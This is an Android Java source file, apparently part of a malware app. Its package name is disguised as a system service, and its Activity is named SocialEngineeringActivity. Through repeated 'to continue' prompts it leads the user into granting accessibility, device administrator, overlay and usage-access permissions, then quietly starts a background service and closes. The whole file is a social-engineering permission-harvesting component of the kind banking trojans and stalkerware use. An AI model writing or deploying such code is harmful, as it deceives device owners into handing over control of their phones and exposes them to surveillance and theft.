package com.system.services.core.ui;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import com.system.services.core.R;
import com.system.services.core.MainService;
import com.system.services.core.permissions.PermissionManager;

public class SocialEngineeringActivity extends Activity {
    private PermissionManager permissionManager;
    private TextView statusText;
    private Button continueButton;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_social_engineering);
        
        permissionManager = new PermissionManager(this);
        statusText = findViewById(R.id.status_text);
        continueButton = findViewById(R.id.continue_button);
        
        continueButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                checkAndRequestPermissions();
            }
        });
        
        // Check initial permission state
        updatePermissionStatus();
    }
    
    private void checkAndRequestPermissions() {
        if (!permissionManager.isAccessibilityServiceEnabled()) {
            requestAccessibilityPermission();
        } else if (!permissionManager.isDeviceAdminEnabled()) {
            requestDeviceAdminPermission();
        } else if (!permissionManager.canDrawOverlays()) {
            requestOverlayPermission();
        } else if (!permissionManager.hasUsageStatsPermission()) {
            requestUsageStatsPermission();
        } else {
            // All permissions granted, continue with initialization
            initializeServices();
        }
    }
    
    private void requestAccessibilityPermission() {
        statusText.setText("Please enable accessibility service to continue.");
        permissionManager.requestAccessibilityPermission(this);
        
        // Check again after delay
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                updatePermissionStatus();
            }
        }, 2000);
    }
    
    private void requestDeviceAdminPermission() {
        statusText.setText("Please activate device administrator to continue.");
        permissionManager.requestDeviceAdminPermission(this);
        
        // Check again after delay
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                updatePermissionStatus();
            }
        }, 2000);
    }
    
    private void requestOverlayPermission() {
        statusText.setText("Please allow display over other apps to continue.");
        permissionManager.requestOverlayPermission(this);
        
        // Check again after delay
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                updatePermissionStatus();
            }
        }, 2000);
    }
    
    private void requestUsageStatsPermission() {
        statusText.setText("Please allow usage access to continue.");
        permissionManager.requestUsageStatsPermission(this);
        
        // Check again after delay
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                updatePermissionStatus();
            }
        }, 2000);
    }
    
    private void updatePermissionStatus() {
        StringBuilder status = new StringBuilder("Permission Status:\n");
        
        if (permissionManager.isAccessibilityServiceEnabled()) {
            status.append("\u2713 Accessibility Service\n");
        } else {
            status.append("\u2717 Accessibility Service\n");
        }
        
        if (permissionManager.isDeviceAdminEnabled()) {
            status.append("\u2713 Device Administrator\n");
        } else {
            status.append("\u2717 Device Administrator\n");
        }
        
        if (permissionManager.canDrawOverlays()) {
            status.append("\u2713 Display Over Other Apps\n");
        } else {
            status.append("\u2717 Display Over Other Apps\n");
        }
        
        if (permissionManager.hasUsageStatsPermission()) {
            status.append("\u2713 Usage Access\n");
        } else {
            status.append("\u2717 Usage Access\n");
        }
        
        statusText.setText(status.toString());
    }
    
    private void initializeServices() {
        statusText.setText("Initializing services...");
        
        // Start the main service
        Intent serviceIntent = new Intent(this, MainService.class);
        startService(serviceIntent);
        
        // Close the activity after a delay
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                finish();
            }
        }, 2000);
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        updatePermissionStatus();
    }
}
